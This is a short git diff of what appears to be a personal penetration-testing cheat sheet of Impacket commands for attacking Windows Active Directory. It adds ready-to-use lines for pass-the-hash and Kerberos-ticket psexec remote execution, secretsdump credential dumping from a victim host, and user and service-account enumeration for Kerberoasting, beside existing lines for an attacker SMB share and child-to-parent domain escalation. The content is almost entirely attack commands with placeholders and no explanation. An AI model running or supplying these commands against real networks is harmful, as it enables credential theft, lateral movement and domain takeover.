@@ -13,5 +13,19 @@ impacket-smbserver -smb2support -username evil -password evil evil $PWD
 impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>
 impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>:'<PASS>'
 
-# psexec via env KRB5CCNAME (testing needed remove dc-ip and target-ip)
-impacket-psexec  -k -no-pass <DOMAIN>/<ADMIN>@<ETC_HOST_FQDN> -dc-ip 192.168.178.70 -target-ip 192.168.178.70
+# psexec
+impacket-psexec <DOMAIN>/<ADMIN>@<HOSTNAME>.<ETC_HOST_FQDN> -hashes <HASH>
+impacket-psexec <DOMAIN>/<ADMIN>:<PASSWORD>@<HOSTNAME>.<ETC_HOST_FQDN> -hashes <HASH>
+
+# psexec via env KRB5CCNAME
+impacket-psexec -k -no-pass <HOSTNAME>.<ETC_HOST_FQDN>
+
+# secretsdump
+impacket-secretsdump <DOMAIN>/<VICTIM>@<ETC_HOST_FQDN> -hashes <LMHASH>:<NTHASH>
+
+# GetADUsers
+impacket-GetADUsers -all -k -no-pass -dc-ip <FQDN> <DOMAIN>/<VICTIM>
+
+# GetUserSPNs
+impacket-GetUserSPNs -all -k -no-pass -dc-ip <FQDN> <DOMAIN>/<VICTIM>
+
